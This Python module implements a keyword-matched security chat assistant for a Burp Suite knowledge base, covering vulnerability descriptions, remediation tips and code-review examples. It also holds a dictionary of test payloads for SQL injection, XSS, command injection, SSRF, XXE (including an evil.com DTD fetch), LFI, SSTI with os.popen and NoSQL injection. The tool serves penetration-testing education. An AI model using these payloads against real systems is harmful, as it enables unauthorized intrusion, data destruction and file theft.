"""
AI Security Assistant Module for Burp Suite KnowledgeBase Platform
===============================================================

Version: 1.0.0-20260301-Senin-2012-WIB

Features:
- Natural language security assistant
- Vulnerability analysis
- Remediation guidance
- Code review assistance
- Security best practices
- Interactive chat
"""

from typing import List, Dict, Optional, Any
from datetime import datetime
from enum import Enum
import uuid
import re


# ============================================
# MODELS
# ============================================

class AssistantCapability(str, Enum):
    VULNERABILITY_ANALYSIS = "vulnerability_analysis"
    REMEDIATION_GUIDANCE = "remediation_guidance"
    CODE_REVIEW = "code_review"
    PAYLOAD_SUGGESTION = "payload_suggestion"
    BEST_PRACTICES = "best_practices"
    EXPLOIT_EXPLANATION = "exploit_explanation"
    BURP_TIPS = "burp_tips"


class MessageRole(str, Enum):
    USER = "user"
    ASSISTANT = "assistant"
    SYSTEM = "system"


class Message:
    """Chat message model"""
    
    def __init__(
        self,
        id: str,
        role: MessageRole,
        content: str,
        timestamp: Optional[datetime] = None,
        metadata: Optional[Dict] = None
    ):
        self.id = id
        self.role = role
        self.content = content
        self.timestamp = timestamp or datetime.now()
        self.metadata = metadata or {}
    
    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "role": self.role.value,
            "content": self.content,
            "timestamp": self.timestamp.isoformat(),
            "metadata": self.metadata
        }


class Conversation:
    """Conversation model"""
    
    def __init__(
        self,
        id: str,
        user_id: str,
        title: str,
        messages: List[Message] = None,
        created_at: Optional[datetime] = None,
        updated_at: Optional[datetime] = None
    ):
        self.id = id
        self.user_id = user_id
        self.title = title
        self.messages = messages or []
        self.created_at = created_at or datetime.now()
        self.updated_at = updated_at or datetime.now()
    
    def add_message(self, message: Message):
        """Add message to conversation"""
        self.messages.append(message)
        self.updated_at = datetime.now()
    
    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "user_id": self.user_id,
            "title": self.title,
            "messages": [m.to_dict() for m in self.messages],
            "created_at": self.created_at.isoformat(),
            "updated_at": self.updated_at.isoformat()
        }


class VulnerabilityFinding:
    """Vulnerability finding model"""
    
    def __init__(
        self,
        vuln_type: str,
        severity: str,
        description: str,
        evidence: str,
        remediation: str,
        cwe_id: Optional[str] = None,
        cvss_score: Optional[float] = None
    ):
        self.vuln_type = vuln_type
        self.severity = severity
        self.description = description
        self.evidence = evidence
        self.remediation = remediation
        self.cwe_id = cwe_id
        self.cvss_score = cvss_score
    
    def to_dict(self) -> dict:
        return {
            "vuln_type": self.vuln_type,
            "severity": self.severity,
            "description": self.description,
            "evidence": self.evidence,
            "remediation": self.remediation,
            "cwe_id": self.cwe_id,
            "cvss_score": self.cvss_score
        }


# ============================================
# KNOWLEDGE BASE
# ============================================

class SecurityKnowledgeBase:
    """Knowledge base for security information"""
    
    def __init__(self):
        self.vulnerabilities = self._init_vulnerabilities()
        self.best_practices = self._init_best_practices()
        self.burp_tips = self._init_burp_tips()
    
    def _init_vulnerabilities(self) -> Dict[str, Dict]:
        """Initialize vulnerability information"""
        return {
            "sql_injection": {
                "description": "SQL injection occurs when user input is embedded in SQL queries without proper sanitization",
                "remediation": "Use parameterized queries or prepared statements. Validate and sanitize all user input.",
                "cwe_id": "CWE-89",
                "cvss_base": 9.8
            },
            "xss": {
                "description": "Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages",
                "remediation": "Escape output based on context. Use Content Security Policy (CSP).",
                "cwe_id": "CWE-79",
                "cvss_base": 7.3
            },
            "command_injection": {
                "description": "Command injection occurs when user input is used in system commands without validation",
                "remediation": "Avoid using user input in system commands. Use allowlists for input validation.",
                "cwe_id": "CWE-78",
                "cvss_base": 9.8
            },
            "ssrf": {
                "description": "Server-Side Request Forgery allows attackers to make the server perform requests",
                "remediation": "Validate all URLs. Use allowlists for permitted domains.",
                "cwe_id": "CWE-918",
                "cvss_base": 8.6
            },
            "xxe": {
                "description": "XML External Entity (XXE) allows attackers to access internal files via XML parsing",
                "remediation": "Disable external entity processing. Use less complex XML parsers.",
                "cwe_id": "CWE-611",
                "cvss_base": 7.5
            },
            "lfi": {
                "description": "Local File Inclusion allows attackers to read sensitive files on the server",
                "remediation": "Avoid using user input in file paths. Use file allowlists.",
                "cwe_id": "CWE-22",
                "cvss_base": 7.5
            },
            "ssti": {
                "description": "Server-Side Template Injection occurs when user input is used in templates",
                "remediation": "Use sandboxed template engines. Don't allow user input in templates.",
                "cwe_id": "CWE-94",
                "cvss_base": 9.8
            },
            "nosql": {
                "description": "NoSQL injection allows attackers to manipulate NoSQL queries",
                "remediation": "Validate and sanitize input. Use parameterized queries.",
                "cwe_id": "CWE-943",
                "cvss_base": 8.6
            },
            "authentication": {
                "description": "Authentication vulnerabilities allow unauthorized access to accounts",
                "remediation": "Implement multi-factor authentication. Use strong password policies.",
                "cwe_id": "CWE-287",
                "cvss_base": 9.8
            },
            "idor": {
                "description": "Insecure Direct Object Reference allows accessing unauthorized resources",
                "remediation": "Implement proper authorization checks. Use indirect references.",
                "cwe_id": "CWE-639",
                "cvss_base": 6.5
            }
        }
    
    def _init_best_practices(self) -> Dict[str, str]:
        """Initialize security best practices"""
        return {
            "secure_development": """
Follow secure development lifecycle:
1. Threat modeling during design
2. Security requirements gathering
3. Secure coding practices
4. Code review and testing
5. Security testing in CI/CD
6. Regular penetration testing
            """,
            "input_validation": """
Input Validation Best Practices:
1. Validate on server-side
2. Use allowlists over denylists
3. Validate type, format, length
4. Sanitize special characters
5. Use parameterized queries
            """,
            "authentication": """
Authentication Best Practices:
1. Multi-factor authentication
2. Strong password policies
3. Account lockout policies
4. Secure session management
5. Password reset flows
6. OAuth/OIDC for auth
            """,
            "authorization": """
Authorization Best Practices:
1. Principle of least privilege
2. Role-based access control
3. Proper session handling
4. CSRF protection
5. Proper error handling
            """,
            "cryptography": """
Cryptography Best Practices:
1. Use strong algorithms (AES-256, RSA-4096)
2. Proper key management
3. TLS for data in transit
4. Hash passwords (bcrypt, Argon2)
5. Don't roll your own crypto
            """
        }
    
    def _init_burp_tips(self) -> List[str]:
        """Initialize Burp Suite tips"""
        return [
            "Use keyboard shortcuts: Ctrl+U (URL encode), Ctrl+B (Base64), Ctrl+Shift+U (URL decode all)",
            "Enable passive scanning to find issues automatically",
            "Use Intruder for brute-force attacks and fuzzing",
            "Utilize Spider to map out application structure",
            "Use Repeater for manual testing and crafting requests",
            "Enable HTTP history logging for detailed analysis",
            "Use Comparer to find differences between responses",
            "Configure target scope to focus on in-scope items",
            "Use Session Handling Rules for complex auth scenarios",
            "Leverage Extensions for additional functionality"
        ]
    
    def get_vulnerability_info(self, vuln_type: str) -> Optional[Dict]:
        """Get vulnerability information"""
        return self.vulnerabilities.get(vuln_type.lower())
    
    def get_best_practice(self, topic: str) -> Optional[str]:
        """Get best practice for a topic"""
        return self.best_practices.get(topic.lower())
    
    def get_random_burp_tip(self) -> str:
        """Get random Burp Suite tip"""
        import random
        return random.choice(self.burp_tips)


# ============================================
# AI ASSISTANT ENGINE
# ============================================

class SecurityAssistant:
    """AI Security Assistant"""
    
    def __init__(self):
        self.knowledge = SecurityKnowledgeBase()
        self.conversations: Dict[str, Conversation] = {}
    
    def create_conversation(self, user_id: str, title: str = "New Chat") -> Conversation:
        """Create a new conversation"""
        conversation = Conversation(
            id=str(uuid.uuid4()),
            user_id=user_id,
            title=title
        )
        self.conversations[conversation.id] = conversation
        return conversation
    
    def get_conversation(self, conversation_id: str) -> Optional[Conversation]:
        """Get conversation by ID"""
        return self.conversations.get(conversation_id)
    
    def get_user_conversations(self, user_id: str) -> List[Conversation]:
        """Get all conversations for a user"""
        return [
            c for c in self.conversations.values()
            if c.user_id == user_id
        ]
    
    def process_message(
        self,
        conversation_id: str,
        user_message: str
    ) -> Message:
        """Process user message and generate response"""
        conversation = self.conversations.get(conversation_id)
        if not conversation:
            raise ValueError("Conversation not found")
        
        # Add user message
        user_msg = Message(
            id=str(uuid.uuid4()),
            role=MessageRole.USER,
            content=user_message
        )
        conversation.add_message(user_msg)
        
        # Generate response
        response = self._generate_response(user_message, conversation)
        
        # Add assistant message
        assistant_msg = Message(
            id=str(uuid.uuid4()),
            role=MessageRole.ASSISTANT,
            content=response["content"],
            metadata=response.get("metadata", {})
        )
        conversation.add_message(assistant_msg)
        
        return assistant_msg
    
    def _generate_response(
        self,
        user_message: str,
        conversation: Conversation
    ) -> Dict[str, Any]:
        """Generate AI response based on user message"""
        message_lower = user_message.lower()
        
        # Check for vulnerability analysis requests
        for vuln_type in self.knowledge.vulnerabilities:
            if vuln_type in message_lower:
                return self._generate_vulnerability_response(vuln_type)
        
        # Check for best practices requests
        for topic in self.knowledge.best_practices:
            if topic in message_lower:
                return self._generate_best_practice_response(topic)
        
        # Check for Burp tips
        if "burp" in message_lower and "tip" in message_lower:
            return {
                "content": self.knowledge.get_random_burp_tip(),
                "metadata": {"type": "burp_tip"}
            }
        
        # Check for code review
        if "review" in message_lower or "analyze" in message_lower:
            return self._generate_code_review_response(user_message)
        
        # Check for payload suggestions
        if "payload" in message_lower:
            return self._generate_payload_suggestion_response(user_message)
        
        # Check for exploitation explanation
        if "explain" in message_lower or "how" in message_lower:
            return self._generate_explanation_response(user_message)
        
        # Default response
        return {
            "content": self._get_default_response(),
            "metadata": {"type": "general"}
        }
    
    def _generate_vulnerability_response(self, vuln_type: str) -> Dict[str, Any]:
        """Generate vulnerability information response"""
        info = self.knowledge.get_vulnerability_info(vuln_type)
        if not info:
            return {"content": "I don't have information about that vulnerability.", "metadata": {}}
        
        response = f"""
## {vuln_type.replace('_', ' ').title()}

**Description:**
{info['description']}

**Remediation:**
{info['remediation']}

**CWE ID:** {info['cwe_id']}
**CVSS Base Score:** {info['cvss_base']}

Would you like me to provide example payloads for testing this vulnerability?
        """
        
        return {
            "content": response.strip(),
            "metadata": {"type": "vulnerability", "vuln_type": vuln_type}
        }
    
    def _generate_best_practice_response(self, topic: str) -> Dict[str, Any]:
        """Generate best practice response"""
        practice = self.knowledge.get_best_practice(topic)
        if not practice:
            return {"content": "I don't have best practices for that topic.", "metadata": {}}
        
        return {
            "content": f"## {topic.replace('_', ' ').title()}\n{practice}",
            "metadata": {"type": "best_practice", "topic": topic}
        }
    
    def _generate_code_review_response(self, user_message: str) -> Dict[str, Any]:
        """Generate code review response"""
        response = """
## Code Review Assistance

I can help you review code for security issues. Here's how to get started:

### Common Issues to Look For:

1. **SQL Injection**
   ```python
   # BAD
   query = f"SELECT * FROM users WHERE id = {user_id}"
   
   # GOOD
   query = "SELECT * FROM users WHERE id = ?"
   cursor.execute(query, (user_id,))
   ```

2. **XSS**
   ```javascript
   // BAD
   element.innerHTML = userInput
   
   // GOOD
   element.textContent = userInput
   ```

3. **Command Injection**
   ```python
   # BAD
   os.system(f"ping {host}")
   
   # GOOD
   subprocess.run(["ping", host])
   ```

Please share the code you'd like me to review!
        """
        
        return {
            "content": response.strip(),
            "metadata": {"type": "code_review"}
        }
    
    def _generate_payload_suggestion_response(self, user_message: str) -> Dict[str, Any]:
        """Generate payload suggestion response"""
        message_lower = user_message.lower()
        
        # Determine vulnerability type
        vuln_type = None
        for vtype in ["sql", "xss", "command", "ssrf", "xxe", "lfi", "ssti", "nosql"]:
            if vtype in message_lower:
                vuln_type = vtype
                break
        
        if not vuln_type:
            return {
                "content": "Which type of payload would you like? Examples: SQL injection, XSS, Command injection, SSRF, XXE, LFI, SSTI, NoSQL",
                "metadata": {"type": "payload_suggestion"}
            }
        
        # Generate payloads based on type
        payloads = {
            "sql": [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "1' AND '1'='1",
                "admin'--"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "{{constructor.constructor('alert(1)')()}}"
            ],
            "command": [
                "; cat /etc/passwd",
                "| whoami",
                "`whoami`",
                "$(whoami)",
                "; ls -la"
            ],
            "ssrf": [
                "http://localhost/",
                "http://127.0.0.1/",
                "http://[::1]/",
                "http://metadata.google.internal/",
                "file:///etc/passwd"
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>'
            ],
            "lfi": [
                "../../../../etc/passwd",
                "....//....//....//....//etc/passwd",
                "/etc/passwd",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "php://filter/convert.base64-encode/resource=index.php"
            ],
            "ssti": [
                "{{7*7}}",
                "{{config}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ],
            "nosql": [
                '{"$ne": null}',
                '{"$gt": ""}',
                '["$gt": ""]',
                '{"$regex": ".*"}',
                '"; return db.admin.findOne({}); var dummy="'
            ]
        }
        
        selected_payloads = payloads.get(vuln_type, [])
        
        response = f"## {vuln_type.upper()} Test Payloads\n\n"
        for i, payload in enumerate(selected_payloads, 1):
            response += f"{i}. `{payload}`\n"
        
        response += "\n\nWould you like me to encode these payloads or explain how they work?"
        
        return {
            "content": response,
            "metadata": {"type": "payload_suggestion", "vuln_type": vuln_type}
        }
    
    def _generate_explanation_response(self, user_message: str) -> Dict[str, Any]:
        """Generate explanation response"""
        response = """
## Security Concept Explanations

I'm here to help explain security concepts! Here are some topics I can help with:

- **Vulnerability types** (SQLi, XSS, CSRF, etc.)
- **Attack techniques** and how they work
- **Defense mechanisms** and best practices
- **Burp Suite** features and usage tips
- **Security testing** methodologies

What would you like to learn about?
        """
        
        return {
            "content": response.strip(),
            "metadata": {"type": "explanation"}
        }
    
    def _get_default_response(self) -> str:
        """Get default response"""
        return """
## Security Assistant

I'm your AI security assistant! I can help you with:

🔍 **Vulnerability Analysis**
- Learn about different vulnerability types
- Understand attack vectors
- Get remediation guidance

📝 **Code Review**
- Identify security issues in code
- Suggest secure alternatives
- Best practices

💉 **Payload Generation**
- Get test payloads for various vulnerabilities
- Learn how payloads work

📚 **Security Education**
- Understand security concepts
- Learn about Burp Suite features
- Security best practices

What would you like to explore?
        """
    
    def analyze_vulnerability(
        self,
        vuln_type: str,
        evidence: str
    ) -> VulnerabilityFinding:
        """Analyze a vulnerability finding"""
        info = self.knowledge.get_vulnerability_info(vuln_type)
        
        if not info:
            return VulnerabilityFinding(
                vuln_type=vuln_type,
                severity="unknown",
                description="Unknown vulnerability type",
                evidence=evidence,
                remediation="Unable to provide remediation"
            )
        
        return VulnerabilityFinding(
            vuln_type=vuln_type,
            severity=self._calculate_severity(info["cvss_base"]),
            description=info["description"],
            evidence=evidence,
            remediation=info["remediation"],
            cwe_id=info["cwe_id"],
            cvss_score=info["cvss_base"]
        )
    
    def _calculate_severity(self, cvss: float) -> str:
        """Calculate severity from CVSS score"""
        if cvss >= 9.0:
            return "critical"
        elif cvss >= 7.0:
            return "high"
        elif cvss >= 4.0:
            return "medium"
        elif cvss > 0:
            return "low"
        return "info"


# ============================================
# DEMO
# ============================================

if __name__ == "__main__":
    assistant = SecurityAssistant()
    
    # Create conversation
    conv = assistant.create_conversation("user_1", "Security Chat")
    print(f"Created conversation: {conv.id}")
    
    # Send message
    response = assistant.process_message(conv.id, "What is SQL injection?")
    print(f"\nAssistant: {response.content[:200]}...")
    
    # Get payload suggestion
    response = assistant.process_message(conv.id, "Give me XSS payloads")
    print(f"\nAssistant: {response.content[:200]}...")
    
    # Analyze vulnerability
    finding = assistant.analyze_vulnerability(
        "sql_injection",
        "User input concatenated to SQL query"
    )
    print(f"\nFinding: {finding.to_dict()}")
